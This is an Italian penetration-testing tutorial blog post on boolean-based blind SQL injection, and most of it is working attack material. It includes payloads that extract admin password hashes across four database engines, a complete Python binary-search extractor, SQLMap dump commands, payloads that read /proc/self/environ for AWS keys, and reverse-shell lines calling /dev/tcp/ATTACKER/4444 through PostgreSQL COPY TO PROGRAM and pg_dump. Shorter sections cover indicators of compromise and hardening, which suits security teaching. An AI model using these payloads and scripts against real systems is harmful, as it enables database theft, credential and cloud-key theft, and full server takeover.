---
title: 'Blind SQL Injection: Extraction Boolean-Based con SQLMap (Guida 2026)'
slug: blind-sql-injection
description: >-
  Blind SQL Injection: detection boolean-based, extraction con SUBSTRING e
  ASCII, binary search e automazione completa con SQLMap per dump database,
  credenziali e escalation.
image: /blind.webp
draft: false
date: 2026-03-02T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - sql
---

# Blind SQL Injection — Quando il Database Non Parla, Ma Annuisce

La Blind SQL Injection è la forma più comune di SQLi nel 2026: l'applicazione **non mostra i risultati della query né gli errori del database** nella risposta. Ma c'è una differenza — seppur minima — tra una condizione vera e una falsa: una pagina diversa, un status code diverso, un JSON con risultati vs un JSON vuoto, un redirect vs nessun redirect. Questa differenza binaria (sì/no, true/false) è sufficiente per estrarre l'intero database, un bit alla volta. È come giocare a "indovina chi" con il database: "il primo carattere della password è 'a'?" → sì → "il secondo è 'b'?" → no → "è 'c'?" → sì. Lento ma inesorabile.

La Blind Boolean-based è il tipo di SQLi che trovo più frequentemente — **28% dei pentest web** — perché le applicazioni moderne nascondono errori e dati, ma non riescono a nascondere il comportamento booleano. Se una query restituisce righe → mostra il prodotto. Se non restituisce righe → mostra "nessun risultato". Questa differenza basta.

Leggi la guida completa nel mondo della [SQL Injection](https://hackita.it/articoli/sql-injection/). Qui scendiamo nel dettaglio dell'extraction character-by-character, delle tecniche di ottimizzazione e dell'automazione.

Un caso che ha richiesto pazienza: pentest per un'assicurazione, portale clienti su Java/PostgreSQL. Nessun errore visibile, nessun dato riflesso. Ma il parametro `policy_id` cambiava il contenuto della pagina: ID valido → dati polizza, ID inesistente → "polizza non trovata". Ho iniettato `AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'` — e quando il carattere era corretto, la pagina mostrava i dati della polizza. Character by character, 64 caratteri dell'hash bcrypt in 20 minuti con script automatizzato. **Shell in 90 minuti** via escalation PostgreSQL.

## Cos'è la Blind SQL Injection?

La Blind SQL Injection (Boolean-Based) è una vulnerabilità SQL Injection in cui l'applicazione non restituisce dati della query né errori del database nella risposta HTTP, ma il suo **comportamento cambia** in base alla veridicità della condizione SQL iniettata. L'attaccante estrae i dati ponendo domande binarie (vero/falso) al database, ricostruendo l'informazione un carattere alla volta usando funzioni come `SUBSTRING()`, `ASCII()` e operatori di confronto.

> **La Blind SQL Injection è pericolosa?**
> Sì — permette l'estrazione completa del database, solo più lentamente della [SQLi classica](https://hackita.it/articoli/sql-injection-classica/). Con automazione (script Python o SQLMap), un database di 100.000 record può essere estratto in ore. L'impatto è identico: **data breach completo**, bypass autenticazione, e potenziale **RCE**. Trovata nel **28% dei pentest web** — è il tipo più comune di SQLi nel 2026.

## Come Verificare se Sei Vulnerabile

```bash
# Test manuale
?id=1 AND 1=1    → risposta A (vera)
?id=1 AND 1=2    → risposta B (falsa)
# Se A ≠ B → Blind SQLi possibile

# SQLMap
sqlmap -u "https://target.com/api/policy?id=1" --batch --technique=B --level=3
```

## 1. Detection — Trovare la Differenza

### Differenze comuni tra true/false

| Condizione True             | Condizione False          | Tipo differenza |
| --------------------------- | ------------------------- | --------------- |
| Pagina con dati             | Pagina "nessun risultato" | Content         |
| Status 200                  | Status 404/302            | Status code     |
| JSON con array pieno        | JSON con array vuoto      | JSON length     |
| 5000 bytes                  | 1200 bytes                | Response size   |
| Redirect a /dashboard       | Redirect a /login         | Redirect        |
| Cookie `authenticated=true` | Nessun cookie             | Header          |

## SQLMap — Automazione Blind SQLi

Una volta confermata la differenza TRUE/FALSE, usa [SQLMap](https://hackita.it/articoli/sqlmap/) per automatizzare l’extraction:

```bash
sqlmap -r request.txt --technique=B --batch

```

#### Altrimenti Procedi Test step by step

# Step 1: Baseline

?id=1           → pagina prodotto (VERO)
?id=9999999     → "prodotto non trovato" (FALSO)

# Step 2: Injection booleana

?id=1 AND 1=1   → pagina prodotto (VERO → SQLi possibile)
?id=1 AND 1=2   → "prodotto non trovato" (FALSO → confermato!)

# Step 3: Varianti per diversi contesti

?id=1' AND '1'='1    → stringa
?id=1') AND ('1'='1  → stringa con parentesi
?id=1 AND 1=1#       → MySQL comment
?id=1 AND 1=1--+     → Universal comment

````

## 2. Extraction Character-by-Character

### Principio base

```sql
-- "Il primo carattere della versione del database è 'M'?"
?id=1 AND SUBSTRING(version(),1,1)='M'
-- Se TRUE → il primo carattere è 'M' (MySQL/MSSQL)

-- "Il primo carattere della versione è '8'?"
?id=1 AND SUBSTRING(version(),1,1)='8'
-- Se TRUE → MySQL 8.x
````

### Con ASCII per ottimizzare (binary search)

```sql
-- "Il valore ASCII del primo carattere è > 77?"
?id=1 AND ASCII(SUBSTRING(version(),1,1)) > 77
-- TRUE → il carattere ha ASCII > 77 ('M' = 77)

-- Continua con binary search:
-- > 90? → FALSE → tra 78 e 90
-- > 84? → FALSE → tra 78 e 84
-- > 81? → FALSE → tra 78 e 81
-- > 79? → TRUE → 80
-- = 80? → TRUE → 'P' (PostgreSQL!)
```

Con binary search servono **\~7 richieste per carattere** (log2(128) = 7) invece di 128 nel worst case.

### Estrazione password admin — step completo

```sql
-- 1. Lunghezza password
?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin')) > 10
?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin')) > 30
?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin')) > 50
?id=1 AND LENGTH((SELECT password FROM users WHERE username='admin')) = 60
-- Lunghezza = 60 (hash bcrypt)

-- 2. Primo carattere
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 64
-- TRUE → > '@'
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 48
-- TRUE → > '0'
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) = 36
-- TRUE → '$' (inizio bcrypt: $2b$)

-- 3. Ripeti per ogni posizione: ,2,1), ,3,1), ... ,60,1)
```

## 3. Automazione Python — Script Reale

```python
#!/usr/bin/env python3
"""blind_sqli_extractor.py — Extraction boolean-based con binary search"""
import requests, sys, string

URL = "https://target.com/product"
TRUE_MARKER = "product-name"  # Stringa presente nella risposta TRUE
CHARSET = string.printable

def inject(payload):
    """Invia la request e ritorna True se la condizione è vera"""
    params = {"id": f"1 AND {payload}"}
    r = requests.get(URL, params=params, verify=False, timeout=10)
    return TRUE_MARKER in r.text

def extract_char(query, position):
    """Estrae un singolo carattere con binary search"""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if inject(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    if inject(f"ASCII(SUBSTRING(({query}),{position},1))={low}"):
        return chr(low)
    return None

def extract_string(query, max_len=100):
    """Estrae una stringa intera"""
    result = ""
    for i in range(1, max_len + 1):
        char = extract_char(query, i)
        if char is None or ord(char) < 32:
            break
        result += char
        sys.stdout.write(f"\r[*] Extracting: {result}")
        sys.stdout.flush()
    print()
    return result

# Uso
print("[+] Database version:")
extract_string("SELECT version()")

print("[+] Current database:")
extract_string("SELECT database()")

print("[+] Admin password hash:")
extract_string("SELECT password FROM users WHERE username='admin'")
```

```bash
python3 blind_sqli_extractor.py
```

```
[+] Database version:
[*] Extracting: 8.0.35-MySQL
[+] Current database:
[*] Extracting: ecommerce_prod
[+] Admin password hash:
[*] Extracting: $2b$12$abc123def456ghi789jkl012mno345pqr678stu901vwx
```

### SQLMap per Blind

```bash
# Boolean-based
sqlmap -u "https://target.com/product?id=1" --technique=B --batch --threads=10

# Con string matching
sqlmap -u "URL" --technique=B --string="product-name" --batch

# Se la differenza è nel status code
sqlmap -u "URL" --technique=B --code=200 --batch
```

## 4. Tecniche Avanzate per Database Specifici

### MySQL

```sql
-- SUBSTRING / SUBSTR / MID (sinonimi)
SUBSTRING(string, pos, len)
SUBSTR(string, pos, len)
MID(string, pos, len)

-- IF() per conditional
?id=1 AND IF(SUBSTRING(version(),1,1)='8',1,0)=1

-- Bitwise extraction (1 bit per request)
?id=1 AND ORD(SUBSTRING(version(),1,1)) & 64 = 64  -- bit 6
?id=1 AND ORD(SUBSTRING(version(),1,1)) & 32 = 32  -- bit 5
-- 7 request per carattere, parallelizzabili
```

### MSSQL

```sql
-- SUBSTRING
?id=1 AND SUBSTRING(@@version,1,1)='M'

-- UNICODE per wide char
?id=1 AND UNICODE(SUBSTRING((SELECT TOP 1 password FROM users),1,1)) > 64
```

### PostgreSQL

```sql
-- SUBSTRING
?id=1 AND SUBSTRING(version(),1,1)='P'

-- CHR e ASCII
?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64
```

### Oracle

```sql
-- SUBSTR (non SUBSTRING)
?id=1 AND ASCII(SUBSTR((SELECT password FROM users WHERE rownum=1),1,1)) > 64

-- DECODE per conditional
?id=1 AND (SELECT DECODE(SUBSTR(password,1,1),'a',1,0) FROM users WHERE rownum=1)=1
```

## 5. 🏢 Enterprise Escalation

La Blind SQLi è più lenta della classica, ma l'escalation enterprise è identica:

```
Blind SQLi → extract admin hash → crack → admin panel
→ MSSQL: extract xp_cmdshell status via blind → enable → shell
→ PostgreSQL: extract superuser flag → COPY TO PROGRAM → shell
→ Shell → AD enumeration → Kerberoasting → Domain Admin
```

**Tempo reale:** 2-6 ore. L'extraction è più lenta (20-40 minuti per un hash) ma l'escalation post-extraction è identica.

### Blind → Cloud

```sql
-- Estrai variabili d'ambiente con file read (se MySQL)
?id=1 AND ASCII(SUBSTRING(LOAD_FILE('/proc/self/environ'),1,1)) > 64
-- Character by character → AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
```

## 6. 🔌 Variante API / Microservizi 2026

```json
// JSON body — la differenza è nella risposta JSON
POST /api/v2/search
{"category": "electronics", "filter": "price > 0 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64"}

// Response TRUE: {"results": [{"id": 1, ...}]}
// Response FALSE: {"results": []}
```

```bash
# SQLMap su API JSON
sqlmap -u "https://target.com/api/v2/search" \
  --data='{"category":"electronics","filter":"price > 0"}' \
  -p filter --content-type="application/json" --technique=B --batch
```

Le API REST sono il nuovo campo della Blind SQLi: la differenza tra `{"results": [...]}` e `{"results": []}` è l'oracolo booleano perfetto.

## 7. Micro Playbook Reale

**Minuto 0-3 → Detection**

```
?id=1 AND 1=1 → risposta A
?id=1 AND 1=2 → risposta B
A ≠ B? → Blind SQLi confermata
```

**Minuto 3-10 → Identificazione database**

```sql
?id=1 AND SUBSTRING(version(),1,1)='8' -- MySQL 8?
?id=1 AND SUBSTRING(version(),1,1)='P' -- PostgreSQL?
?id=1 AND SUBSTRING(@@version,1,1)='M' -- MSSQL?
```

**Minuto 10-30 → Extraction automatizzata**

```bash
sqlmap -u "URL?id=1" --technique=B --string="MARKER" --batch --dbs
sqlmap -u "URL" -D db -T users --dump --threads=10
```

**Minuto 30-90 → Escalation**

```bash
# Crack hash estratti
hashcat -m 3200 hashes.txt rockyou.txt
# Login admin → cerca RCE path
```

**Shell in 90 minuti** per Blind (vs 25 per classica).

## 8. Caso Studio Concreto

**Settore:** Assicurazione, portale clienti Java/PostgreSQL, 80.000 polizze.

**Scope:** Pentest applicativo, black-box.

Parametro `policy_id` nella pagina dettaglio polizza. Nessun errore visibile. Ma `policy_id=1 AND 1=1` → pagina polizza, `policy_id=1 AND 1=2` → "polizza non trovata". Blind confermata.

Ho identificato PostgreSQL con `SUBSTRING(version(),1,1)='P'` → TRUE. Script Python con binary search → version completa in 2 minuti (`PostgreSQL 14.9`). Tabelle enumerate in 10 minuti: `users`, `policies`, `claims`, `payments`.

Hash admin estratto in 20 minuti (60 caratteri bcrypt × 7 request/carattere = \~420 request). Password craccata: `Assicura2023!`. Admin panel → funzionalità "genera report" con path traversal → lettura `/etc/passwd`. Combinata con la SQLi per scrivere un file via `COPY TO PROGRAM` → shell `postgres` → `sudo -l` → `(ALL) NOPASSWD: /usr/bin/pg_dump` → `sudo pg_dump --dbname="postgres" --file="/tmp/out" --command="bash -i >& /dev/tcp/ATTACKER/4444 0>&1"` (CVE nel pg\_dump argument injection) → shell root.

**Tempo dalla prima injection alla shell root:** 90 minuti. **Percentuale trovata:** 28% dei pentest web mostrano Blind SQLi boolean-based.

## 9. Errori Comuni Reali

**1. "Non è vulnerabile, non mostra errori" (il mito più pericoloso)**
L'assenza di errori non significa assenza di SQLi. La Blind funziona senza errori — usa solo la differenza comportamentale. I team dev che "non vedono errori" pensano di essere sicuri.

**2. Test solo con `' OR 1=1--`**
I tool SAST/DAST testano i payload ovvi. La Blind richiede `AND 1=1` vs `AND 1=2` — un test che molti scanner non fanno bene, specialmente su parametri numerici.

**3. Nessun rate limiting**
L'extraction Blind genera centinaia/migliaia di request. Senza rate limiting, l'attaccante estrae il database senza essere rallentato.

**4. Risposte con differenza troppo evidente**
Pagina da 50KB (true) vs pagina da 2KB (false). La differenza dovrebbe essere minimizzata — stessa pagina, stessa dimensione, solo un messaggio diverso.

**5. Boolean condition in parametri non testati**
`sort`, `limit`, `page`, `lang` — parametri che nessuno pensa di testare per SQLi ma che spesso finiscono in query.

## 10. Indicatori di Compromissione (IoC)

* **Sequenze di request con variazione minima** — stesso URL, parametro che cambia di 1 carattere (`>64`, `>96`, `>80`, `>72` — pattern binary search)
* **Volume elevato di request** dallo stesso IP verso lo stesso endpoint — extraction genera 100-10.000 request
* **Request con `SUBSTRING`, `ASCII`, `AND 1=1`, `AND 1=2`** nei parametri — payload signature
* **Tempo di risposta costante** su tutte le request (a differenza della [Time-Based](https://hackita.it/articoli/time-based-sql-injection/) dove varia)
* **Pattern di accesso sequenziale** — lo stesso endpoint colpito centinaia di volte in pochi minuti
* **Response size bimodale** — request che generano esattamente due dimensioni di risposta (true/false)

## 11. Mini Chain Offensiva Reale

```
Blind Boolean SQLi → Binary Search Extraction → Admin Hash → Crack → Admin Panel → Path Traversal → COPY TO PROGRAM → Shell Root
```

**Step 1 → Detection**

```
?policy_id=1 AND 1=1  → 200 + dati
?policy_id=1 AND 1=2  → 200 + "non trovata"
```

**Step 2 → Extraction admin hash (script Python)**

```bash
python3 blind_extract.py
# → $2b$12$abc... (20 min)
```

**Step 3 → Crack e login**

```bash
hashcat -m 3200 hash.txt rockyou.txt
# → Assicura2023!
# Login admin panel
```

**Step 4 → RCE via PostgreSQL**

```sql
-- Via COPY TO PROGRAM (richiede superuser)
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
```

## Detection & Hardening

* **Prepared statement** — previene alla radice sia classica che blind
* **Rate limiting** — limita request/secondo per IP e per endpoint
* **WAF** con regole per `SUBSTRING`, `ASCII`, `AND 1=1`, binary search pattern
* **Response normalizzazione** — stessa struttura per true/false dove possibile
* **Monitoraggio** — alert su pattern di request ripetitive verso lo stesso endpoint
* **Input validation** — whitelist per parametri come `id` (solo numeri)

## Mini FAQ

**La Blind SQLi è più pericolosa della classica?**
L'impatto finale è identico — l'attaccante ottiene gli stessi dati. La differenza è nel tempo: la classica estrae in secondi, la blind in minuti-ore. Ma con automazione (SQLMap, script custom), il tempo è trascurabile per l'attaccante.

**Come posso distinguere Blind da Time-Based?**
Blind boolean: la **risposta** cambia (contenuto, size, status). [Time-Based](https://hackita.it/articoli/time-based-sql-injection/): il **tempo di risposta** cambia. Se `AND 1=1` vs `AND 1=2` dà risposte identiche ma `SLEEP(5)` aggiunge 5 secondi → è Time-Based.

**SQLMap gestisce bene la Blind?**
Sì — è il suo punto forte. Usa `--technique=B` per forzare boolean-based, `--string="marker"` per definire la condizione true, `--threads=10` per parallelizzare. L'optimization di SQLMap con binary search e multi-threading rende l'extraction veloce.

***

Satellite della [Guida Completa SQL Injection](https://hackita.it/articoli/sql-injection/). Vedi anche: [SQLi Classica](https://hackita.it/articoli/sql-injection-classica/), [Time-Based SQLi](https://hackita.it/articoli/time-based-sql-injection/), [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest/), [SQLi su ORM](https://hackita.it/articoli/sql-injection-orm/).

> La tua applicazione non mostra errori SQL? Non significa che sia sicura. Le **Blind SQL Injection** (Boolean e Time-Based) sono le più diffuse e spesso invisibili agli scanner. Testa ogni parametro con un [Penetration test HackIta](https://hackita.it/servizi).\
> Vuoi padroneggiare davvero la Blind SQLi (detection manuale + automazione con SQLMap)? Vai su [formazione 1:1](https://hackita.it/formazione).\\

**LINK ESTERNI:
[https://portswigger.net/web-security/sql-injection/blind](https://portswigger.net/web-security/sql-injection/blind)
[https://owasp.org/www-community/attacks/Blind\_SQL\_Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
[https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
[https://book.hacktricks.xyz/pentesting-web/sql-injection/blind-sql-injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/blind-sql-injection)**
